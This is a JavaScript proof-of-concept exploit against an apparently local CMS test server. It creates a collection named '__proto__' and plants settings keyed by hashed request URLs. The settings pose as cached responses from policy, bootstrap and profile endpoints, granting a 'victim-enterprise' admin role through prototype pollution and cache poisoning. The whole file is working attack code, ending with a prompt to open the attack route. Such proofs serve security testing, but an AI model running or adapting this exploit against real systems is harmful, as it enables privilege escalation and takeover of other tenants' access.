import {createHash} from 'node:crypto';

const origin = process.env.POC_ORIGIN ?? 'http://127.0.0.1:4000';
const slug = '__proto__';

function cacheKey(url, method = 'GET', responseType = 'json', body = '', params = '') {
  return createHash('sha256')
    .update([method, responseType, url, body, params].join('\0'))
    .digest('hex');
}

function transferHttpResponse(body, url) {
  return {b: body, h: {}, s: 200, st: 'OK', u: url, rt: 'json'};
}

async function jsonFetch(path, init = {}) {
  const response = await fetch(`${origin}${path}`, {
    ...init,
    headers: {'content-type': 'application/json', ...(init.headers ?? {})},
  });

  if (!response.ok) {
    throw new Error(`${init.method ?? 'GET'} ${path} -> ${response.status}: ${await response.text()}`);
  }

  return response.json();
}

async function addSetting(name, value) {
  await jsonFetch(`/api/editor/collections/${encodeURIComponent(slug)}/settings`, {
    method: 'POST',
    body: JSON.stringify({name, value}),
  });
}

await jsonFetch('/api/reset', {method: 'POST', body: '{}'});
await jsonFetch('/api/editor/collections', {
  method: 'POST',
  body: JSON.stringify({slug}),
});

const urls = {
  policy: `${origin}/api/policy`,
  guardedPolicy: `${origin}/api/policy-guarded`,
  bootstrap: `${origin}/api/bootstrap`,
  profile: `${origin}/api/profile`,
};

await addSetting(
  cacheKey(urls.policy),
  transferHttpResponse(
    {
      allowed: true,
      role: 'admin',
      tenant: 'victim-enterprise',
      signed: false,
      source: 'attacker-inherited-policy',
    },
    urls.policy,
  ),
);

await addSetting(
  cacheKey(urls.guardedPolicy),
  transferHttpResponse(
    {
      allowed: true,
      role: 'admin',
      tenant: 'victim-enterprise',
      signed: false,
      source: 'attacker-inherited-guarded-policy',
    },
    urls.guardedPolicy,
  ),
);

await addSetting(
  cacheKey(urls.bootstrap),
  transferHttpResponse(
    {
      tenant: 'victim-enterprise',
      internalFeature: 'billing-export',
      signed: false,
      source: 'attacker-inherited-bootstrap',
    },
    urls.bootstrap,
  ),
);

await addSetting(
  cacheKey(urls.profile),
  transferHttpResponse(
    {
      name: 'victim-admin',
      plan: 'enterprise',
      signed: false,
      source: 'attacker-inherited-profile',
    },
    urls.profile,
  ),
);

console.log(`Seeded attacker-controlled CMS collection at ${origin}`);
console.log('Open /poc/cache-poison/resource/__proto__ or any stronger attack route.');
